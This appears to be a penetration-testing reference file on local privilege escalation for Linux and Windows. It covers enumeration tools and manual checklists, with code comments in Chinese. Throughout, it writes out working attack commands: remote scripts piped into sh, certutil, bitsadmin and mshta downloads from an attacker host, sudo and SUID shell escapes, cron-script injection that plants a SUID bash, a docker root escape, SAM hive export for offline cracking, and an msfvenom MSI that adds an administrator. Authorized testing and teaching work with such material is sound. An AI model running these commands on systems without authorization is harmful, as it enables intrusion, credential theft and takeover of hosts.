# Privilege Escalation

> **When to read this file**: when you already have a low-privilege shell on the target (Linux/Unix or Windows), or when you need to enumerate and audit a system's local privilege escalation surface.

## Quick Decision Table

| Scenario | Preferred Tool | Alternatives | Key Difference |
|---|---|---|---|
| Full enumeration from a low-privilege Linux shell | linpeas | unix-privesc-check | linpeas has the widest coverage with color-coded severity; unix-privesc-check is tiny and focused on file-permission issues |
| Full enumeration from a low-privilege Windows shell | winPEASx64.exe | the Windows manual checklist in this file + PowerUp | winPEAS covers services/registry/tokens in one command; the manual checklist suits scenarios where dropping an EXE is not an option |
| Suspected cron/scheduled-task privilege escalation | pspy | `cat /etc/crontab` + `systemctl list-timers` | pspy shows the full command lines of root processes without needing root |
| System check from a compliance/audit perspective | lynis | unix-privesc-check | lynis produces a full report with hardening advice; unix-privesc-check only lists escalation vectors |
| Install Linux/Windows/macOS privesc scripts all at once | peass (apt package) | download each from GitHub releases | one apt package of about 88MB, usable offline |
| SUID/sudo hit on a known system binary | GTFOBins (payload library) | — | look up ready-made abuse commands instead of crafting your own |
| Windows need to execute/download via built-in binaries | LOLBAS | — | whitelisted payloads such as certutil/bitsadmin/mshta |
| Older kernel or component version | searchsploit (Exploit-DB) | MSF `local_exploit_suggester` | full local search over public exploits with copyable exploit files |

## Privilege Escalation Workflow (Methodology)

1. Stabilize the shell (Linux): `python3 -c 'import pty; pty.spawn("/bin/bash")'`, then `export TERM=xterm` (after Ctrl+Z, run `stty raw -echo; fg`).
2. Automated enumeration: run linpeas (Linux) or winPEAS (Windows) directly on the target to get the full picture.
3. Manually verify key surfaces: see the two checklists below — automated tools may be blocked by EDR, have their output truncated, or miss findings; critical items must be re-checked by hand.
4. Verify every lead in the matching database: Linux binaries → GTFOBins; Windows binaries → LOLBAS; version vulnerabilities → Exploit-DB (searchsploit).
5. Try kernel exploits last: match the version exactly and validate locally first — a failed attempt often crashes the target and costs you the foothold.

## Core Tools in Depth

### linpeas — De-facto Standard for Linux Local Privilege Escalation Enumeration

**Purpose**: the Linux enumeration shell script from the PEASS suite. In one pass it checks hundreds of items — SUID/SGID, capabilities, sudo rules, cron, writable files, kernel version, NFS, container escape surfaces — with color-coded output (red/yellow ≈ 94% probability of a real escalation path).
**Installation**: `sudo apt install peass` (the script lives at `/usr/share/peass/linpeas/linpeas.sh`)
**Use cases**: the first step after landing any low-privilege Linux shell; a single file implemented in pure shell with no dependencies, well suited for transfer to targets on isolated networks.

```bash
# Kali 上把脚本投递到目标机
cp /usr/share/peass/linpeas/linpeas.sh . && sudo python3 -m http.server 80

# 目标机:全量检查(-a 含较慢的深度检查),输出落盘
./linpeas.sh -a > linpeas.out 2>&1
less -R linpeas.out                       # -R 保留颜色码便于分级阅读

# 目标机不能落地文件时,管道直接执行
curl http://<kali-ip>/linpeas.sh | sh
wget -qO- http://<kali-ip>/linpeas.sh | sh

# 目标机可出网时,从官方 release 直接执行
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 常用参数:-a 全量检查;-e 额外枚举(执行默认跳过的检查);-s 静默且更快;
# -P <password> 指定 sudo 密码;-w 大块检查间等待;-q 不显示 banner;-N 无颜色输出
# 按类别选检(无排除路径功能,缩小检查面用 -o 指定类别)
./linpeas.sh -o system_information,users_information,software_information,interesting_files
```

**Practical tips**:
- The output is extremely long: search the red sections first, then the yellow items in the `/etc/sudoers`, `SUID`, `Capabilities`, `Cron`, and `Writable` sections.
- Pair it with GTFOBins: for every SUID/sudoable binary linpeas lists, look up the matching tag on GTFOBins.
- Color codes flood a reverse shell; always redirect to a file and read it with `less -R`.
- linpeas only enumerates, it does not exploit; fetch exploitation payloads for hits from GTFOBins/Exploit-DB.

### winPEASx64.exe — De-facto Standard for Windows Local Privilege Escalation Enumeration

**Purpose**: the Windows enumerator from the PEASS suite (a standalone C#-compiled EXE). It checks services (insecure permissions/unquoted paths), registry credentials, AlwaysInstallElevated, token privileges, installed software and patches, scheduled tasks, writable PATH directories, and more.
**Installation**: `sudo apt install peass` (located at `/usr/share/peass/winpeas/winPEASx64.exe`; there is also the 32-bit winPEASx86.exe)
**Use cases**: the first step from a low-privilege Windows shell; the `.exe` is dependency-free, and the `.bat` version works when running EXEs is not an option.

```bash
# Kali 上投递
cp /usr/share/peass/winpeas/winPEASx64.exe . && sudo python3 -m http.server 80
```

```cmd
:: 目标机:certutil 下载后执行
certutil.exe -urlcache -f http://<kali-ip>/winPEASx64.exe wp.exe
wp.exe

:: 或 PowerShell 下载
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<kali-ip>/winPEASx64.exe','wp.exe')"

:: 重定向到文件时去掉颜色,只看高价值发现
wp.exe quiet notcolor > wp.out

:: 域信息枚举并写日志(网络信息枚举是默认检查项 networkinfo,无需额外参数)
wp.exe domain log=C:\Temp\wp.log
```

**Practical tips**:
- Read the `whoami /priv` related sections first: privileges such as SeImpersonate/SeBackup are the shortest path (see the privilege mapping table in the Windows checklist).
- Run `wmic os get osarchitecture` to confirm 32/64-bit before choosing the EXE version.
- Antivirus frequently flags winPEAS: if it is blocked, fall back to the manual checklist in this file (built entirely from system-native commands).
- On an "insecure service permission/unquoted service path" hit, manually confirm writability with `accesschk` and `icacls`.

### peass — The linpeas/winpeas/macpeas Suite Package

**Purpose**: the Kali metapackage for Privilege Escalation Awesome Scripts SUITE; one apt package delivers enumeration tools for all three platforms — Linux/Windows/macOS (about 88MB).
**Installation**: `sudo apt install peass`
**Use cases**: stocking deliverable payloads for all three platforms offline on Kali instead of downloading each one from GitHub.

```bash
# 安装后关键文件位置
/usr/share/peass/linpeas/linpeas.sh
/usr/share/peass/winpeas/winPEASx64.exe
/usr/share/peass/winpeas/winPEASx86.exe

# 从官方 release 拉最新版(目标机可出网时的替代来源)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
```

**Practical tips**:
- The apt version updates on the Kali rolling cycle and lags behind GitHub releases; use the direct release links for the newest detection rules.
- The 88MB is mostly multi-architecture winPEAS binaries; if you only need linpeas, simply `wget` the script alone.
- The suite repository also ships each tool's README with output interpretation and exploitation advice.

### pspy — Monitor Linux Processes and cron Without root

**Purpose**: a command-line tool that polls `/proc` and listens via inotify, letting a low-privilege user see the full command lines other users (including root) execute in real time plus filesystem events, without injecting into any process.
**Installation**: `sudo apt install pspy` (includes the static binaries pspy/pspy32/pspy64)
**Use cases**: when you suspect an escalation point in cron/systemd timers/other users' scripts (writable scripts, PATH hijacking, plaintext passwords on command lines) — observe first, then act.

```bash
# 目标机:常驻运行,实时输出新进程命令行与文件事件
./pspy64

# 后台运行落盘,过一段时间回看
./pspy64 > pspy.log 2>&1 &

# 只看 root 执行的命令(输出行格式:CMD: UID=0  PID=xx  |  <command>)
grep "UID=0" pspy.log

# 完整参数列表
./pspy64 -h
```

**Practical tips**:
- Complements static cron configuration: when `crontab -l` cannot see root's entries, pspy captures the executions live.
- A root script invokes "a command without an absolute path" and that directory is writable → PATH hijacking; once pspy confirms the execution context, drop a malicious file with the same name.
- Backup script command lines often carry plaintext database passwords — a direct credential source for lateral movement/escalation.
- When output is heavy, always log to disk, then filter by UID/CMD/time window.

### lynis — System Security Auditing (Linux/Unix)

**Purpose**: an auditing and hardening tool that scans system configuration and outputs a system-information overview, WARNINGs (security issues) and SUGGESTIONs (hardening advice), with a non-interactive mode for automated audits.
**Installation**: `sudo apt install lynis`
**Use cases**: when you need audit-style report output (the "system hardening recommendations" section of a pentest report), or the target environment only permits gentle configuration checks; for offensive enumeration prefer linpeas.

```bash
# 官网示例:快速模式(-Q)+ cronjob 格式(非交互、无按键确认)
sudo lynis -Q --cronjob

# 新版子命令风格:完整系统审计
sudo lynis audit system

# 只跑快速测试集,减少耗时
sudo lynis audit system --quick

# 报告与日志位置
sudo grep -E "warning|suggestion" /var/log/lynis-report.dat
sudo lynis show details <test-id>     # 例:SSH-7408
```

**Practical tips**:
- Running as root covers far more than a normal user (it can read more files); running as a normal user reports many skipped tests.
- The report lands at `/var/log/lynis-report.dat` and the log at `/var/log/lynis.log`.
- Outputs valuable for escalation: weak file permissions, writable configurations, outdated kernels/components, passwordless accounts, misconfigured sudo.
- `--quick` skips deep tests — good for a time-boxed quick health check.

### unix-privesc-check — Lightweight File-Permission Privesc Check Script

**Purpose**: a single shell script from pentestmonkey that checks file permissions and other misconfigurations that could let a local user escalate privileges or access local applications (such as databases); search the output for `WARNING` to find issues.
**Installation**: `sudo apt install unix-privesc-check` (only 85KB)
**Use cases**: when the target is too constrained in space/bandwidth for linpeas; or as a second opinion to cross-check file-permission findings from linpeas. A single script, no unpacking or compiling — upload and run directly.

```bash
# 官网示例:standard 模式
unix-privesc-check standard

# detailed 模式:更多检查项、更慢
unix-privesc-check detailed

# 只看告警行
unix-privesc-check standard | grep -i warning

# 投递到目标机(脚本本体在 Kali 的 /usr/bin/unix-privesc-check)
cp /usr/bin/unix-privesc-check . && sudo python3 -m http.server 80
```

**Practical tips**:
- Running as root checks more (it can read more files), but the results from a normal user reflect that user's truly usable escalation surface — worth running both ways.
- The output lacks linpeas's color grading; grepping the `WARNING` keyword is the only way to locate issues.
- Its specialty is path permissions (writable scripts, readable configurations, weak umask); it does not cover kernel vulnerabilities or credential searches.
- It supports non-Linux Unixes such as Solaris/HP-UX/FreeBSD — one of the few usable options on legacy systems.

## Linux Privilege Escalation Checklist (Manual Commands)

### 1. Kernel and System Information → Decide Whether to Pursue a Kernel Vulnerability

```bash
uname -a                       # 内核版本 + 架构
cat /etc/os-release            # 发行版与版本
ps auxww | head -30            # 关键进程
dpkg -l 2>/dev/null | wc -l    # 软件包规模(决定凭据搜索面)
```

If the kernel/component version matches a row below, pull the exploit directly with `searchsploit`:

| Version Range | Vulnerability Name | CVE | Notes |
|---|---|---|---|
| Linux 2.6.22 – 4.8.3 | Dirty COW | CVE-2016-5195 | copy-on-write race that can modify read-only files (e.g. /etc/passwd) |
| Linux 5.8 – 5.16.11 / 5.15.25 / 5.10.102 | Dirty Pipe | CVE-2022-0847 | pipe flag bug that overwrites read-only files |
| pkexec (polkit) before the 2022-01 patch | PwnKit | CVE-2021-4034 | env injection; preinstalled on almost every distro |
| glibc ≤ 2.38 (before the 2023-10 patch) | Looney Tunables | CVE-2023-4911 | GLIBC_TUNABLES environment variable overflow |
| sudo 1.8.2–1.8.32p2 / 1.9.0–1.9.5p1 | Baron Samedit | CVE-2021-3156 | stack overflow; no interaction, no known password needed |
| Ubuntu OverlayFS kernels (before the 2023 patch) | OverlayFS PE | CVE-2023-2640 + CVE-2023-32229 | a dual-CVE combination, Ubuntu-specific |

### 2. SUID/SGID and capabilities → Cross-check Against GTFOBins

```bash
find / -type f -perm -04000 2>/dev/null        # SUID
find / -type f -perm -02000 2>/dev/null        # SGID
find / -type f -perm -06000 2>/dev/null        # SUID+SGID
getcap -r / 2>/dev/null                        # 文件 capabilities
```

- For every binary hit, look up the "SUID" / "Capabilities" tags on GTFOBins.
- A `cap_setuid` hit (e.g. perl) works directly: `perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/sh";'`

### 3. sudo Rules → The Most Common Low-Hanging Fruit

```bash
sudo -l                            # 当前用户可 sudo 执行的命令
sudo -V | head -1                  # sudo 版本(对照 CVE-2021-3156)
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null
```

- `(root) NOPASSWD: /usr/bin/<bin>` → grab payloads from the GTFOBins "Sudo" tag, for example:
  - `sudo find . -exec /bin/sh \; -quit`
  - `sudo vim -c ':!/bin/sh'`
  - `sudo awk 'BEGIN {system("/bin/sh")}'`
  - `sudo less /etc/shadow` (type `!sh` once inside)
- When the rule is `(ALL, !root)` and sudo < 1.8.28, bypass with `sudo -u#-0 <cmd>` (CVE-2019-14287).

### 4. cron and Scheduled Tasks → Watch Executions Live with pspy

```bash
crontab -l 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ /var/spool/cron/crontabs/ 2>/dev/null
systemctl list-timers --all 2>/dev/null
```

- A writable root cron script itself → inject directly: `echo 'cp /bin/bash /tmp/b && chmod +s /tmp/b' >> <writable-root-script>`
- A root script calls a command without an absolute path and PATH contains a writable directory → drop a same-named malicious file for PATH hijacking (confirm the order with `echo $PATH`).

### 5. Writable Files/Directories and Mounts

```bash
find / -writable -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -50
find / -writable -type d ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -50
mount | grep -i "no_suid\|nosuid"               # 反查允许 SUID 的挂载
cat /etc/exports                                 # NFS no_root_squash = 即时 root
```

- NFS `no_root_squash` exploitation (attacker side): `sudo mount -t nfs <ip>:/<share> /mnt/nfs`, place a SUID bash as root, then go back to the target and execute it.

### 6. Users, Groups, and Credential Leftovers

```bash
id                                   # docker/lxd/disk 组都有对应即时提权
awk -F: '$3==0 {print $1}' /etc/passwd     # 额外 UID=0 用户
ls -la /etc/shadow /etc/passwd              # shadow 对低权限可读本身即提权线索
cat ~/.bash_history /home/*/.bash_history 2>/dev/null | grep -iE "pass|sudo|ssh" | head
find / -name "id_rsa" -o -name "*.pem" -o -name "*.kdbx" 2>/dev/null | head
env | grep -iE "pass|secret|token|key"
```

- docker group: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` (root right after the chroot).

## Windows Privilege Escalation Checklist (Manual Commands)

### 1. System Information and Patch Level

```cmd
systeminfo
wmic os get osarchitecture
wmic qfe get Caption,Description,HotFixID,InstalledOn
whoami /all
net user
net localgroup administrators
```

- After `systeminfo > sysinfo.txt`, use windows-exploit-suggester (`--systeminfo sysinfo.txt`) to match missing patches.
- Inside a meterpreter session: `run post/multi/recon/local_exploit_suggester` automatically suggests local escalation modules.

### 2. Token Privileges (whoami /priv) → Privilege Mapping Table

| Privilege | Escalation Path |
|---|---|
| SeImpersonatePrivilege | the Potato family (common for service accounts such as IIS/MSSQL), see the table below |
| SeAssignPrimaryTokenPrivilege | also works with Potato-family payloads |
| SeBackupPrivilege | export with `reg save hklm\sam sam.hiv` + `reg save hklm\system system.hiv`, then crack offline |
| SeRestorePrivilege | overwrite any system file (replace a service binary) |
| SeTakeOwnershipPrivilege | take ownership of any file (e.g. replace utilman.exe) |
| SeLoadDriverPrivilege | load a known-vulnerable driver (e.g. Capcom.sys) |
| SeDebugPrivilege | open/migrate into SYSTEM processes, dump LSASS |

- Offline cracking after a SeBackup export (attacker side): `impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL`

Choosing within the Potato family (all require an SeImpersonate-class privilege):

| Tool | Applicable Conditions |
|---|---|
| JuicyPotato | before Win10 1809 / Server 2019, with port 135 or 5985 available |
| RoguePotato | newer systems; needs a remote machine available for relaying |
| PrintSpoofer | Print Spooler service running |
| GodPotato | broad-spectrum version for Windows Server 2012–2022 |

### 3. Service Escalation Surface

```cmd
wmic service get name,displayname,pathname,startmode | findstr /vi "windows"
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User"
wmic startup get caption,command
```

- Unquoted service path containing spaces + writable parent directory → drop a malicious EXE to hijack the service name.
- Writable service binary/config check (Sysinternals): `accesschk64.exe /accepteula -uwcqv "Authenticated Users" *`
- Directory ACL check: `icacls "C:\Program Files\<dir>"` (watch for `(F)`/`(M)` with a principal of Users/Everyone).

### 4. AlwaysInstallElevated (MSI Installed as SYSTEM)

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- Exploitable when both values are `0x1`. Generate the MSI on the attacker box:

```bash
msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f msi -o setup.msi
```

```cmd
:: 目标机以 SYSTEM 静默安装
msiexec /quiet /qn /i C:\Temp\setup.msi
```

### 5. Credential and Registry Leftovers

```cmd
cmdkey /list
runas /savecred /user:<domain>\<user> cmd.exe
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
dir /a C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
wmic product get name,version
```

- PowerShell history files often contain passwords in plaintext; `runas /savecred` runs arbitrary programs with stored credentials, no password needed.

## After Finding an Exploitable Issue: Where to Look

| Database | URL | When to Query |
|---|---|---|
| GTFOBins | https://gtfobins.github.io | legitimate binaries hit via SUID/SGID, sudo, or capabilities on Linux; grab ready-made abuse payloads |
| LOLBAS | https://lolbas-project.github.io | built-in Windows binaries and scripts for execution/download/persistence |
| Exploit-DB | local searchsploit (apt package exploitdb, preinstalled on Kali) | search public exploits by kernel and component versions such as sudo/polkit |
| PEASS-ng | https://github.com/peass-ng/PEASS-ng | the latest linpeas/winPEAS releases and output interpretation |
| Metasploit | `post/multi/recon/local_exploit_suggester` | auto-matches local escalation modules inside a meterpreter session |

```bash
# searchsploit 典型检索与取用
searchsploit linux kernel 5.4 local privilege escalation
searchsploit sudo 1.8
searchsploit polkit
searchsploit -m <exploit-id>      # 把利用文件复制到当前目录
searchsploit -u                   # 更新漏洞数据库
```

Common LOLBAS payloads (download and execution both use built-in binaries, often to bypass script restrictions):

```cmd
:: certutil 下载
certutil.exe -urlcache -f http://<ip>/tool.exe tool.exe

:: bitsadmin 下载
bitsadmin /transfer j /download /priority high http://<ip>/x.exe C:\Temp\x.exe

:: mshta 执行远程 hta
mshta.exe http://<ip>/evil.hta

:: InstallUtil 执行恶意 C# 程序(/U 走卸载构造器)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U evil.exe
```

## Remaining Tools — Quick Reference

| Tool | One-line Purpose | Package | Most Common Command |
|---|---|---|---|
| pspy-binaries | precompiled binary set for pspy (same package as pspy, including multi-architecture versions such as pspy32/pspy64) | pspy | `./pspy64 > pspy.log 2>&1 &` |

---

This file is for penetration testing with written authorization, CTF competitions, and security education scenarios only.
